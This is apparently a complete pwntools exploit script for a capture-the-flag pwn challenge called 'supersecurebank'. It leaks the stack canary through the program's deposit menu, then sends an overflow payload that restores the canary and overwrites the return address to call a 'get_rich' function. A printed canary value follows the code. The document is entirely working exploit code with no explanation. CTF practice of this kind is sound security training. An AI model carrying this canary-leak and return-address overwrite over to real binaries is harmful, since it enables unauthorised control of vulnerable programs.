from pwn import * 

elf = context.binary = ELF('./supersecurebank')
context.terminal = ()

if args.REMOTE:
    p = remote('super-secure-bank.challs.olicyber.it', 38080)
elif args.GDB:
    p = gdb.debug(elf.path, gdbscript='''
        b deposit
        c
    ''')
else:
    p = elf.process()


p.sendlineafter(b'Choice: ',b'1')
p.sendlineafter(b':',b'1')
p.sendlineafter(b':',b'9'*8)
p.recvline()
canary = u64(p.recv(7).strip().ljust(8,b'\x00'))
p.recvline()
payload = b'a'*24 + b'\x00' +p64(canary) + b'a'*7 + p64(elf.sym['get_rich']) + b'a'* 10
print(len(payload))
p.sendlineafter(b'name: ',payload)
print(hex(canary))

p.interactive()
0xe418d8672595c2